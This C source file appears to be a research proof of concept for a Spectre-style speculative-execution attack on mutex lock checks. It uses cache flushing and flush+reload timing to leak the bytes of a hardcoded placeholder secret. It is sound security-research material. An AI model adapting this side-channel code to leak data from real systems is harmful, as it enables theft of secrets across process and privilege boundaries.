#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0

cp_t* flush_reload_arr;

void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
    pthread_mutex_lock(lock_ptr);
    volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
}

void victim_func(int lock_index, int secret_index) {

    pthread_mutex_t k, l, m;
    pthread_mutex_init(&k, NULL);
    pthread_mutex_init(&l, NULL);
    pthread_mutex_init(&m, NULL);

    int  k_idx = 0;
    int  l_idx = 1;
    int  m_idx = 2;
    int  n_locks = 3;
    pthread_mutex_t* klm_addresses[n_locks];
    klm_addresses[k_idx] = &k;
    klm_addresses[l_idx] = &l;
    klm_addresses[m_idx] = &m;

    //array that tracks which locks are locked. Default value is false.
    char locked[n_locks] __attribute__ ((aligned (256)));
    for(int i = 0; i < n_locks; i++) locked[i] = false;

    //lock either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
    pthread_mutex_t* klm_address = klm_addresses[lock_index];
    pthread_mutex_lock(klm_address);
    locked[lock_index] = true;

    //Remove locked[k_idx] from cache, so that the branch will speculatively execute.
    cpuid();
    flush((void*)&locked[k_idx]);
    cpuid();

    if(!locked[k_idx]) {
        pthread_mutex_lock(&k);
        volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
        //attack_func(&k, secret_index);
    }

    cpuid();

    if(!locked[k_idx]) pthread_mutex_unlock(&k);
    if(!locked[l_idx]) pthread_mutex_unlock(&l);
    if(!locked[m_idx]) pthread_mutex_unlock(&m);

}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char lock_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        lock_indices[i] = 2;
        secret_indices[i] = 0;
    }
    lock_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("%d:\lock %d\tsecret %d\n", i, lock_indices[i], secret_indices[i]);
        victim_func(lock_indices[i], secret_indices[i]);
        cpuid();
        if(lock_indices[i] != 0) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}